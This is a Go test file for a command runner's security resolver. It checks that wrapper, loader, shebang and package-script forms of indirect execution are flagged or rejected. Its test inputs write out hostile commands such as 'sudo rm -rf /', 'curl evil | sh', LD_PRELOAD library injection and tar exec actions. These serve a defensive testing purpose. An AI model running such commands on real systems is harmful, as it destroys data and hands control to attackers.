//go:build test

package security

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/isseis/go-safe-cmd-runner/internal/runner/base/risktypes"
	"github.com/isseis/go-safe-cmd-runner/internal/runner/base/runnertypes"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// analyzeIndirectCmd is a terse helper for calling the resolver in tests.
func analyzeIndirectCmd(cmd string, args ...string) IndirectExecutionResult {
	return AnalyzeIndirectExecution(cmd, args)
}

// hasArtifactPath reports whether the artifact list contains an entry for path.
func hasArtifactPath(arts []risktypes.ExecutedArtifact, path string) bool {
	for _, a := range arts {
		if a.Path == path {
			return true
		}
	}
	return false
}

// hasReason reports whether the result carries the given reason code.
func hasReason(res IndirectExecutionResult, code risktypes.ReasonCode) bool {
	for _, c := range res.ReasonCodes {
		if c == code {
			return true
		}
	}
	return false
}

// TestIndirect_WrapperSudoCritical verifies a privilege token reached through a
// wrapper (env/timeout/xargs) is Critical.
func TestIndirect_WrapperSudoCritical(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		args []string
	}{
		{"env sudo", "env", []string{"sudo", "ls"}},
		{"timeout sudo", "timeout", []string{"5", "sudo", "rm"}},
		{"xargs sudo", "xargs", []string{"sudo", "rm"}},
		{"nice sudo", "nice", []string{"-n", "10", "sudo", "ls"}},
		{"env -S sudo", "env", []string{"-S", "sudo rm -rf /"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd(tc.cmd, tc.args...)
			assert.Equal(t, IndirectCritical, res.Kind)
			assert.Equal(t, runnertypes.RiskLevelCritical, res.Level)
			assert.True(t, hasReason(res, risktypes.ReasonPrivilegeEscalation))
		})
	}
}

// TestIndirect_WrapperDestructive verifies a wrapped destructive or
// system-modification command keeps a risk at least as high as the unwrapped form.
func TestIndirect_WrapperDestructive(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		args []string
		want runnertypes.RiskLevel
	}{
		{"env rm -rf", "env", []string{"rm", "-rf", "/tmp/x"}, runnertypes.RiskLevelHigh},
		{"timeout systemctl stop", "timeout", []string{"10", "systemctl", "stop", "nginx"}, runnertypes.RiskLevelHigh},
		{"nice -n 5 rm -rf", "nice", []string{"-n", "5", "rm", "-rf", "/tmp/x"}, runnertypes.RiskLevelHigh},
		{"chrt deadline opts rm", "chrt", []string{"-T", "1000", "-P", "2000", "0", "rm", "-rf", "/tmp/x"}, runnertypes.RiskLevelHigh},
		{"timeout -- terminator", "timeout", []string{"--", "5", "rm", "-rf", "/tmp/x"}, runnertypes.RiskLevelHigh},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd(tc.cmd, tc.args...)
			assert.Equal(t, IndirectFloor, res.Kind)
			assert.Equal(t, tc.want, res.Level)
		})
	}
}

// TestIndirect_WrapperProfileFactors verifies a wrapped command's risk profile
// (network / data-exfiltration) is folded, so a profiled command is not
// under-classified when wrapped.
func TestIndirect_WrapperProfileFactors(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		args []string
		want runnertypes.RiskLevel
	}{
		{"env claude", "env", []string{"claude"}, runnertypes.RiskLevelHigh},
		{"env curl url", "env", []string{"curl", "https://example.com"}, runnertypes.RiskLevelMedium},
		{"timeout wget", "timeout", []string{"5", "wget", "http://example.com"}, runnertypes.RiskLevelMedium},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd(tc.cmd, tc.args...)
			assert.Equal(t, IndirectFloor, res.Kind)
			assert.Equal(t, tc.want, res.Level)
		})
	}
}

// TestIndirect_ShellInlineHigh verifies inline shell/interpreter code is High.
// Shells use -c only; interpreters also use -e.
func TestIndirect_ShellInlineHigh(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		args []string
	}{
		{"bash -c", "bash", []string{"-c", "rm -rf /"}},
		{"sh -c", "sh", []string{"-c", "echo hi"}},
		{"python -c", "python", []string{"-c", "import os"}},
		{"perl -e", "perl", []string{"-e", "print 1"}},
		{"node -e", "node", []string{"-e", "process.exit()"}},
		{"bash combined -xc", "bash", []string{"-xc", "rm -rf /"}},
		{"bash combined -ic", "bash", []string{"-ic", "evil"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd(tc.cmd, tc.args...)
			assert.Equal(t, IndirectFloor, res.Kind)
			assert.Equal(t, runnertypes.RiskLevelHigh, res.Level)
		})
	}

	// "bash -e script.sh" is errexit, not inline code: it must not be flagged via
	// the inline path (-e is not an inline flag for shells).
	res := analyzeIndirectCmd("bash", "-e", "script.sh")
	assert.NotEqual(t, IndirectReject, res.Kind)
}

// TestIndirect_InnerCommandGated verifies the extracted inner command is gated:
// its risk is folded, and an inner form that cannot be bound is rejected.
func TestIndirect_InnerCommandGated(t *testing.T) {
	// Inner command's risk is folded and the inner is recorded as a chain artifact.
	res := analyzeIndirectCmd("env", "rm", "-rf", "/tmp/x")
	assert.Equal(t, IndirectFloor, res.Kind)
	assert.Equal(t, runnertypes.RiskLevelHigh, res.Level)
	require.NotEmpty(t, res.Artifacts)
	found := false
	for _, a := range res.Artifacts {
		if a.Role == risktypes.RoleInner && filepath.Base(a.Path) == "rm" {
			found = true
		}
	}
	assert.True(t, found, "inner command must be recorded as a RoleInner artifact")

	// An inner form that cannot be identity-bound (find -exec child process)
	// propagates as a rejection rather than passing the gate.
	rej := analyzeIndirectCmd("env", "find", "/tmp", "-exec", "rm", "{}", ";")
	assert.Equal(t, IndirectReject, rej.Kind)

	// The inner command is recorded as a chain artifact even on deny paths
	// (Critical), so the indirect-execution chain stays auditable.
	crit := analyzeIndirectCmd("env", "sudo", "ls")
	assert.Equal(t, IndirectCritical, crit.Kind)
	assert.True(t, hasArtifactPath(crit.Artifacts, "sudo"), "deny path must still record the inner artifact")
}

// TestIndirect_WrapperNoCommandMedium verifies a wrapper invoked with no inner
// command is Medium and is distinct from an unextractable (rejected) form.
func TestIndirect_WrapperNoCommandMedium(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		args []string
	}{
		{"env only assignment", "env", []string{"FOO=bar"}},
		{"env bare", "env", nil},
		{"timeout duration only", "timeout", []string{"5"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd(tc.cmd, tc.args...)
			assert.Equal(t, IndirectFloor, res.Kind)
			assert.Equal(t, runnertypes.RiskLevelMedium, res.Level)
		})
	}
}

// TestIndirect_EnvPathResolutionSwap verifies env overriding PATH with a bare
// inner command is rejected (the inner cannot be resolved safely), while an
// absolute inner command is still resolved.
func TestIndirect_EnvPathResolutionSwap(t *testing.T) {
	rej := analyzeIndirectCmd("env", "PATH=/tmp", "rm", "-rf", "/")
	assert.Equal(t, IndirectReject, rej.Kind)

	// Absolute inner path is unaffected by the PATH override: it resolves and the
	// destructive risk is folded.
	ok := analyzeIndirectCmd("env", "PATH=/tmp", "/bin/rm", "-rf", "/")
	assert.Equal(t, IndirectFloor, ok.Kind)
	assert.Equal(t, runnertypes.RiskLevelHigh, ok.Level)
}

// TestIndirect_WrapperLoaderEnvRejected verifies loader-control environment
// variables supplied through env are rejected on every OS.
func TestIndirect_WrapperLoaderEnvRejected(t *testing.T) {
	cases := []struct {
		name string
		args []string
	}{
		{"LD_PRELOAD", []string{"LD_PRELOAD=/tmp/evil.so", "ls"}},
		{"LD_LIBRARY_PATH", []string{"LD_LIBRARY_PATH=/tmp", "ls"}},
		{"LD_AUDIT", []string{"LD_AUDIT=/tmp/a.so", "ls"}},
		{"DYLD_INSERT_LIBRARIES", []string{"DYLD_INSERT_LIBRARIES=/tmp/x.dylib", "ls"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd("env", tc.args...)
			assert.Equal(t, IndirectReject, res.Kind)
			assert.True(t, hasReason(res, risktypes.ReasonForbiddenEnvVar))
		})
	}
}

// TestIndirect_EnvSplitString verifies env -S split-string interpretation:
// a hidden sudo is Critical, a destructive inner is folded, an empty split is
// rejected.
func TestIndirect_EnvSplitString(t *testing.T) {
	crit := analyzeIndirectCmd("env", "-S", "sudo rm -rf /")
	assert.Equal(t, IndirectCritical, crit.Kind)

	high := analyzeIndirectCmd("env", "-S", "rm -rf /tmp/x")
	assert.Equal(t, IndirectFloor, high.Kind)
	assert.Equal(t, runnertypes.RiskLevelHigh, high.Level)

	empty := analyzeIndirectCmd("env", "-S", "   ")
	assert.Equal(t, IndirectReject, empty.Kind)

	// Combined --split-string= form is parsed the same way.
	combined := analyzeIndirectCmd("env", "--split-string=sudo ls")
	assert.Equal(t, IndirectCritical, combined.Kind)

	// Arguments after the split-string are not discarded: env -S prepends the
	// split tokens to the remaining argv, so a hidden sudo there is still Critical.
	remaining := analyzeIndirectCmd("env", "-S", "env", "sudo", "ls")
	assert.Equal(t, IndirectCritical, remaining.Kind)

	// A payload using env -S escape/quote/substitution processing cannot be
	// faithfully whitespace-split, so it must fail closed (Reject) rather than
	// silently mis-tokenize and let a hidden command through.
	for _, payload := range []string{`sudo\tls`, `'sudo' ls`, `"sudo" ls`, `${X} ls`, `sudo ls #comment`, "`whoami` ls"} {
		res := analyzeIndirectCmd("env", "-S", payload)
		assert.Equalf(t, IndirectReject, res.Kind, "payload %q must fail closed", payload)
	}
}

// TestIndirect_NestedWrapperAndDepthGuard verifies the resolver recurses through
// nested wrappers (so a deeply wrapped privilege or destructive command is still
// caught) and that the recursion depth guard rejects a pathologically deep chain.
func TestIndirect_NestedWrapperAndDepthGuard(t *testing.T) {
	// Nested wrapper reaching a privilege token stays Critical.
	crit := analyzeIndirectCmd("env", "timeout", "5", "sudo", "ls")
	assert.Equal(t, IndirectCritical, crit.Kind)

	// Nested wrapper reaching a destructive command stays High.
	high := analyzeIndirectCmd("env", "nice", "-n", "5", "rm", "-rf", "/tmp/x")
	assert.Equal(t, IndirectFloor, high.Kind)
	assert.Equal(t, runnertypes.RiskLevelHigh, high.Level)

	// A chain of wrappers deeper than the recursion guard is rejected rather than
	// silently bottoming out.
	deep := make([]string, indirectExecMaxDepth+2)
	for i := range deep {
		deep[i] = "env"
	}
	deep[len(deep)-1] = "ls"
	res := analyzeIndirectCmd("env", deep...)
	assert.Equal(t, IndirectReject, res.Kind)
}

// TestIndirect_FindXargsTargetGated verifies find/xargs child-process exec forms
// are rejected (they cannot be identity-bound), while a find without an exec
// action is not an indirect form.
func TestIndirect_FindXargsTargetGated(t *testing.T) {
	for _, action := range []string{"-exec", "-execdir", "-ok", "-okdir"} {
		t.Run("find "+action, func(t *testing.T) {
			res := analyzeIndirectCmd("find", "/tmp", "-name", "*.x", action, "rm", "{}", ";")
			assert.Equal(t, IndirectReject, res.Kind)
		})
	}

	xargs := analyzeIndirectCmd("xargs", "-I", "{}", "rm", "{}")
	assert.Equal(t, IndirectReject, xargs.Kind)
	// The extracted target must be recorded as an artifact so the chain is
	// traceable in audits even on reject paths.
	assert.Equal(t, 1, len(xargs.Artifacts), "xargs must record the target artifact")
	assert.Equal(t, "rm", xargs.Artifacts[0].Path)
	assert.Equal(t, risktypes.RoleExecTarget, xargs.Artifacts[0].Role)

	// find -exec sudo is Critical; sudo must appear in the artifact chain.
	sudoFind := analyzeIndirectCmd("find", "/tmp", "-exec", "sudo", "rm", "{}", ";")
	assert.Equal(t, IndirectCritical, sudoFind.Kind)
	assert.Equal(t, 1, len(sudoFind.Artifacts))
	assert.Equal(t, "sudo", sudoFind.Artifacts[0].Path)
	assert.Equal(t, risktypes.RoleExecTarget, sudoFind.Artifacts[0].Role)

	plain := analyzeIndirectCmd("find", "/tmp", "-type", "f")
	assert.Equal(t, IndirectNone, plain.Kind)

	// xargs shares the getopt operand scanner, so the "--" terminator and the
	// fail-closed-on-unknown-long rule apply here too. "xargs -- sudo" runs sudo.
	xargsTerm := analyzeIndirectCmd("xargs", "--", "sudo", "rm")
	assert.Equal(t, IndirectCritical, xargsTerm.Kind, "xargs -- sudo must reach the privilege target")
	// An unknown long option may consume the next token, so the target boundary is
	// unreliable; the xargs form is deny-only, so it rejects with no target artifact.
	xargsUnknown := analyzeIndirectCmd("xargs", "--unknown-long", "rm")
	assert.Equal(t, IndirectReject, xargsUnknown.Kind)
	assert.Empty(t, xargsUnknown.Artifacts, "an unreliable xargs scan records no target artifact")
}

// TestSkipLeadingOptions verifies the shared getopt operand scanner that the
// wrapper, xargs, and package-runner classifiers all build on: the "--"
// terminator, separated/attached value-options, and the two unknown-option
// policies. Locking it here keeps the option-surface handling consistent across
// every call site instead of being re-derived per classifier.
func TestSkipLeadingOptions(t *testing.T) {
	valueOpts := setOf("-s", "--signal")
	for _, tc := range []struct {
		name         string
		args         []string
		unknown      unknownOptionPolicy
		wantIdx      int
		wantReliable bool
	}{
		{"no options", []string{"cmd", "a"}, shortOptsAreBoolean, 0, true},
		{"separated value option", []string{"-s", "KILL", "cmd"}, shortOptsAreBoolean, 2, true},
		{"attached long value", []string{"--signal=KILL", "cmd"}, shortOptsAreBoolean, 1, true},
		{"dash terminator", []string{"--", "-weird"}, shortOptsAreBoolean, 1, true},
		{"lone dash is operand", []string{"-"}, shortOptsAreBoolean, 0, true},
		{"no operand", []string{"-s", "KILL"}, shortOptsAreBoolean, 2, true},
		// shortOptsAreBoolean: unknown short is assumed value-less, unknown long fails closed.
		{"unknown short assumed boolean", []string{"-x", "cmd"}, shortOptsAreBoolean, 1, true},
		{"unknown long unreliable", []string{"--mystery", "cmd"}, shortOptsAreBoolean, 1, false},
		// anyUnknownIsUnreliable: any unrecognized option (short or long) fails closed.
		{"strict unknown short unreliable", []string{"-x", "cmd"}, anyUnknownIsUnreliable, 1, false},
		{"strict unknown long unreliable", []string{"--mystery", "cmd"}, anyUnknownIsUnreliable, 1, false},
		// An attached "=" form is self-contained, so it is safe even under the strict policy.
		{"strict attached value safe", []string{"--mystery=v", "cmd"}, anyUnknownIsUnreliable, 1, true},
	} {
		t.Run(tc.name, func(t *testing.T) {
			idx, reliable := skipLeadingOptions(tc.args, optSpec{valueOpts: valueOpts, unknown: tc.unknown})
			assert.Equal(t, tc.wantReliable, reliable)
			if tc.wantReliable {
				assert.Equal(t, tc.wantIdx, idx)
			}
		})
	}
}

// TestIndirect_DynamicLoaderGated verifies a direct dynamic-loader invocation is
// rejected.
func TestIndirect_DynamicLoaderGated(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		args []string
	}{
		{"ld-linux preload", "/lib64/ld-linux-x86-64.so.2", []string{"--preload", "/tmp/x.so", "/bin/ls"}},
		{"ld-linux library-path", "ld-linux-x86-64.so.2", []string{"--library-path", "/tmp", "/bin/ls"}},
		{"ld.so", "ld.so", []string{"/bin/ls"}},
		{"macos dyld", "dyld", []string{"/bin/ls"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd(tc.cmd, tc.args...)
			assert.Equal(t, IndirectReject, res.Kind)
		})
	}
}

// TestIndirect_WrapperNameCollisionFailsClosed verifies that when a command's
// symlink chain carries both a wrapper name and an unbindable form name (find,
// xargs, the dynamic loader), the stricter reject/Critical disposition wins. The
// chain-name set is order-independent, so a wrapper-named symlink pointing at
// find/xargs/ld-linux must not be short-circuited onto the lenient resolve-inner
// path.
func TestIndirect_WrapperNameCollisionFailsClosed(t *testing.T) {
	// symlinkNamed creates <dir>/<linkName> -> <dir>/<targetName>; both the link
	// name and the target basename land in the resolved chain-name set. The target
	// need not be a real executable: the resolver matches by name only.
	symlinkNamed := func(t *testing.T, linkName, targetName string) string {
		t.Helper()
		dir := t.TempDir()
		target := filepath.Join(dir, targetName)
		require.NoError(t, os.WriteFile(target, []byte{}, 0o644))
		link := filepath.Join(dir, linkName)
		require.NoError(t, os.Symlink(target, link))
		return link
	}

	// A "timeout"-named symlink pointing at find with an -exec sudo primary must be
	// Critical (privilege escalation), not resolved as the timeout wrapper.
	findLink := symlinkNamed(t, "timeout", "find")
	findRes := analyzeIndirectCmd(findLink, "/tmp", "-exec", "sudo", "rm", "{}", ";")
	assert.Equal(t, IndirectCritical, findRes.Kind, "find -exec sudo behind a wrapper-named symlink must stay Critical")

	// A "nice"-named symlink pointing at xargs must be rejected (child-process exec
	// cannot be identity-bound), not resolved as the nice wrapper.
	xargsLink := symlinkNamed(t, "nice", "xargs")
	xargsRes := analyzeIndirectCmd(xargsLink, "rm", "-rf", "/tmp/x")
	assert.Equal(t, IndirectReject, xargsRes.Kind, "xargs behind a wrapper-named symlink must stay Reject")

	// A "stdbuf"-named symlink pointing at the dynamic loader must be rejected.
	loaderLink := symlinkNamed(t, "stdbuf", "ld-linux-x86-64.so.2")
	loaderRes := analyzeIndirectCmd(loaderLink, "--preload", "/tmp/x.so", "/bin/ls")
	assert.Equal(t, IndirectReject, loaderRes.Kind, "dynamic loader behind a wrapper-named symlink must stay Reject")
}

// TestIndirect_UnextractableWrapperRejected verifies an unextractable wrapper form
// is rejected (not silently downgraded), distinct from the Medium no-command case.
func TestIndirect_UnextractableWrapperRejected(t *testing.T) {
	res := analyzeIndirectCmd("env", "--unknown-flag", "ls")
	assert.Equal(t, IndirectReject, res.Kind)

	// A wrapper whose option parsing mis-locates the command so that the extracted
	// token still begins with "-" fails closed rather than evaluating the wrong
	// token (e.g. an unknown value-taking option consumed the real positional).
	assert.Equal(t, IndirectReject, analyzeIndirectCmd("timeout", "--unknown-val", "5", "-rf").Kind)
	// nice's "-NUM" adjustment is still handled: the real command is extracted.
	assert.Equal(t, IndirectFloor, analyzeIndirectCmd("nice", "-10", "rm", "-rf", "/tmp/x").Kind)
	// An unknown long option (--foo) may or may not consume the next token, so
	// the command boundary is unreliable; fail closed even when the extracted
	// token doesn't start with "-" (e.g. --mystery-opt /val sudo).
	assert.Equal(t, IndirectReject, analyzeIndirectCmd("timeout", "--mystery-opt", "/val", "sudo", "ls").Kind)
	assert.Equal(t, IndirectReject, analyzeIndirectCmd("nice", "--mystery-opt", "/val", "sudo", "ls").Kind)

	// Contrast: env with no command is Medium, not Reject.
	noCmd := analyzeIndirectCmd("env", "FOO=bar")
	assert.Equal(t, IndirectFloor, noCmd.Kind)
	assert.Equal(t, runnertypes.RiskLevelMedium, noCmd.Level)

	// The "--" option terminator is a valid form, not an unknown option: the
	// following token is the command and must still be evaluated, even when the
	// command itself begins with "-".
	assert.NotEqual(t, IndirectReject, analyzeIndirectCmd("env", "--", "ls").Kind)
	assert.NotEqual(t, IndirectReject, analyzeIndirectCmd("env", "--", "-weird-cmd").Kind)
	assert.NotEqual(t, IndirectReject, analyzeIndirectCmd("env", "--", "--also-a-cmd").Kind)
	assert.Equal(t, IndirectCritical, analyzeIndirectCmd("env", "--", "sudo", "ls").Kind)
	// Forbidden assignments after "--" are still caught.
	assert.Equal(t, IndirectReject, analyzeIndirectCmd("env", "--", "LD_PRELOAD=/tmp/x.so", "ls").Kind)
}

// TestIndirect_PackageScriptRunnerHigh verifies package script runners are High.
func TestIndirect_PackageScriptRunnerHigh(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		args []string
	}{
		{"npm run", "npm", []string{"run", "build"}},
		{"npx", "npx", []string{"cowsay", "hi"}},
		{"yarn run", "yarn", []string{"run", "build"}},
		{"pnpm run", "pnpm", []string{"run", "build"}},
		{"pnpm dlx", "pnpm", []string{"dlx", "create-app"}},
		{"npm test lifecycle", "npm", []string{"test"}},
		{"npm start lifecycle", "npm", []string{"start"}},
		{"yarn start lifecycle", "yarn", []string{"start"}},
		{"yarn script shorthand", "yarn", []string{"build"}},
		{"pnpm script shorthand", "pnpm", []string{"deploy"}},
		{"env yarn build wrapped", "env", []string{"yarn", "build"}},
		// An unknown separated option before the verb shifts the parse position, so
		// fail closed (High) rather than miss the hidden "run build" script.
		{"npm unknown sep option", "npm", []string{"--loglevel", "silent", "run", "build"}},
		{"yarn unknown sep option", "yarn", []string{"--frozen-lockfile", "build"}},
		// bun and bunx must be treated the same as yarn/npm/pnpm.
		{"bun run", "bun", []string{"run", "build"}},
		{"bun script shorthand", "bun", []string{"deploy"}},
		{"bunx", "bunx", []string{"create-app"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd(tc.cmd, tc.args...)
			assert.Equal(t, IndirectFloor, res.Kind)
			assert.Equal(t, runnertypes.RiskLevelHigh, res.Level)
		})
	}
}

// TestIndirect_ShebangInterpreterGated verifies a direct script with a shebang is
// evaluated through its interpreter chain.
func TestIndirect_ShebangInterpreterGated(t *testing.T) {
	cases := []struct {
		name    string
		shebang string
	}{
		{"env python", "#!/usr/bin/env python\n"},
		{"bin sh", "#!/bin/sh\n"},
		{"bin bash", "#!/bin/bash -e\n"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			dir := t.TempDir()
			script := filepath.Join(dir, "deploy.sh")
			require.NoError(t, os.WriteFile(script, []byte(tc.shebang+"echo hi\n"), 0o755))

			res := analyzeIndirectCmd(script)
			assert.Equal(t, IndirectFloor, res.Kind)
			assert.Equal(t, runnertypes.RiskLevelHigh, res.Level)
			interp := 0
			for _, a := range res.Artifacts {
				if a.Role == risktypes.RoleInterpreter {
					interp++
				}
			}
			assert.Equal(t, 1, interp, "shebang interpreter must be recorded exactly once, as RoleInterpreter")
		})
	}

	// A script whose basename matches a wrapper (e.g. "env") must be evaluated
	// through its shebang interpreter chain, not as the wrapper.
	t.Run("script named env takes shebang over wrapper match", func(t *testing.T) {
		dir := t.TempDir()
		script := filepath.Join(dir, "env") // basename == "env"
		require.NoError(t, os.WriteFile(script, []byte("#!/usr/bin/python3\nprint('hi')\n"), 0o755))
		res := analyzeIndirectCmd(script)
		assert.Equal(t, IndirectFloor, res.Kind, "shebang must win over wrapper basename match")
		interpCount := 0
		for _, a := range res.Artifacts {
			if a.Role == risktypes.RoleInterpreter {
				interpCount++
			}
		}
		assert.Equal(t, 1, interpCount, "shebang interpreter must be recorded exactly once")
	})

	// A non-shebang file (regular ELF-like content) is not an indirect form.
	dir := t.TempDir()
	bin := filepath.Join(dir, "tool")
	require.NoError(t, os.WriteFile(bin, []byte{0x7f, 'E', 'L', 'F', 0, 0}, 0o755))
	assert.Equal(t, IndirectNone, analyzeIndirectCmd(bin).Kind)
}

// TestIndirect_CommandExecOptionsGated verifies command options that run an
// external helper from a child process are rejected.
func TestIndirect_CommandExecOptionsGated(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		args []string
		want IndirectExecutionKind
	}{
		{"rsync -e", "rsync", []string{"-e", "ssh -p 22", "src", "dst"}, IndirectReject},
		{"rsync --rsh=", "rsync", []string{"--rsh=ssh", "src", "dst"}, IndirectReject},
		{"rsync -essh attached", "rsync", []string{"-essh", "src", "dst"}, IndirectReject},
		{"rsync -avze bundle", "rsync", []string{"-avze", "ssh", "src", "dst"}, IndirectReject},
		{"tar --to-command=", "tar", []string{"--to-command=/tmp/x", "-cf", "a.tar", "."}, IndirectReject},
		{"tar --checkpoint-action=", "tar", []string{"--checkpoint-action=exec=sh", "-cf", "a.tar", "."}, IndirectReject},
		{"tar plain", "tar", []string{"-cf", "a.tar", "."}, IndirectNone},
		// The "--" terminator ends option scanning: an operand that looks like a
		// helper option (e.g. a destination literally named "-e") must not be
		// rejected as a remote-shell form.
		{"rsync -- -e operand", "rsync", []string{"--", "-e", "dst"}, IndirectNone},
		{"tar -- --to-command operand", "tar", []string{"-cf", "a.tar", "--", "--to-command"}, IndirectNone},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd(tc.cmd, tc.args...)
			assert.Equal(t, tc.want, res.Kind)
		})
	}
}

// TestIndirect_ServiceInitScriptGated verifies the SysV init script behind a
// service command is recorded as a chain artifact and the form stays High.
func TestIndirect_ServiceInitScriptGated(t *testing.T) {
	res := analyzeIndirectCmd("service", "nginx", "start")
	assert.Equal(t, IndirectFloor, res.Kind)
	assert.Equal(t, runnertypes.RiskLevelHigh, res.Level)

	require.NotEmpty(t, res.Artifacts)
	assert.Equal(t, "/etc/init.d/nginx", res.Artifacts[0].Path)
	assert.Equal(t, risktypes.RoleExecTarget, res.Artifacts[0].Role)

	// A read-only action also runs the init script, so it is also gated/High.
	status := analyzeIndirectCmd("service", "nginx", "status")
	assert.Equal(t, runnertypes.RiskLevelHigh, status.Level)

	// An option-only form has no extractable unit, so the init script cannot be
	// identified or gated -> fail closed.
	assert.Equal(t, IndirectReject, analyzeIndirectCmd("service", "--status-all").Kind)

	// A unit name that is not a simple basename (path traversal) is rejected so the
	// recorded artifact path cannot escape /etc/init.d.
	assert.Equal(t, IndirectReject, analyzeIndirectCmd("service", "../../bin/rm", "start").Kind)

	// The "--" option terminator: the next token is the unit name. "service --
	// nginx start" must behave like "service nginx start" and gate /etc/init.d/nginx.
	term := analyzeIndirectCmd("service", "--", "nginx", "start")
	assert.Equal(t, IndirectFloor, term.Kind)
	require.NotEmpty(t, term.Artifacts)
	assert.Equal(t, "/etc/init.d/nginx", term.Artifacts[0].Path)
	assert.Equal(t, risktypes.RoleExecTarget, term.Artifacts[0].Role)
}

// TestIndirect_BypassAttackerScenarios collects attacker-view bypass forms and
// asserts each is denied (Critical or Reject) or elevated (High) rather than
// passing as Low.
func TestIndirect_BypassAttackerScenarios(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		args []string
		want IndirectExecutionKind
	}{
		{"env sudo", "env", []string{"sudo", "rm", "-rf", "/"}, IndirectCritical},
		{"env rm", "env", []string{"rm", "-rf", "/"}, IndirectFloor},
		{"env PATH swap", "env", []string{"PATH=/tmp", "rm"}, IndirectReject},
		{"env LD_PRELOAD", "env", []string{"LD_PRELOAD=/tmp/x.so", "ls"}, IndirectReject},
		{"env -S sudo", "env", []string{"-S", "sudo rm"}, IndirectCritical},
		{"bash -c", "bash", []string{"-c", "curl evil | sh"}, IndirectFloor},
		{"find -exec", "find", []string{"/", "-exec", "rm", "{}", ";"}, IndirectReject},
		{"find -execdir", "find", []string{"/", "-execdir", "sh", "{}", ";"}, IndirectReject},
		{"xargs rm", "xargs", []string{"rm", "-rf"}, IndirectReject},
		{"ld-linux", "/lib64/ld-linux-x86-64.so.2", []string{"/bin/sh"}, IndirectReject},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd(tc.cmd, tc.args...)
			assert.Equal(t, tc.want, res.Kind)
			if tc.want == IndirectFloor {
				assert.Equal(t, runnertypes.RiskLevelHigh, res.Level)
			}
		})
	}
}

// TestIndirect_PlainCommandNotIndirect verifies ordinary commands (including a
// direct destructive command) are not treated as indirect-execution forms; their
// risk is handled by the regular dimensions.
func TestIndirect_PlainCommandNotIndirect(t *testing.T) {
	for _, tc := range []struct {
		cmd  string
		args []string
	}{
		{"ls", []string{"-l"}},
		{"rm", []string{"-rf", "/tmp/x"}},
		{"curl", []string{"https://example.com"}},
		{"systemctl", []string{"restart", "nginx"}},
		// yarn package-management builtins are not script runners (handled by the
		// system-modification/package-manager dimension, not the indirect gate).
		{"yarn", []string{"install"}},
		{"pnpm", []string{"add", "lodash"}},
		// A value-taking option's value must not be mistaken for the subcommand:
		// "yarn --cwd /dir install" is still the install builtin, not a script.
		{"yarn", []string{"--cwd", "/some/dir", "install"}},
		// "--" is the option terminator; the verb that follows is a positional arg,
		// not a script invocation. "yarn -- install" must not be flagged as High.
		{"yarn", []string{"--", "install"}},
		{"pnpm", []string{"--", "install"}},
		// bun with "--" option terminator followed by a package-manager builtin is not a script.
		{"bun", []string{"--", "install"}},
	} {
		t.Run(tc.cmd, func(t *testing.T) {
			assert.Equal(t, IndirectNone, analyzeIndirectCmd(tc.cmd, tc.args...).Kind)
		})
	}
}
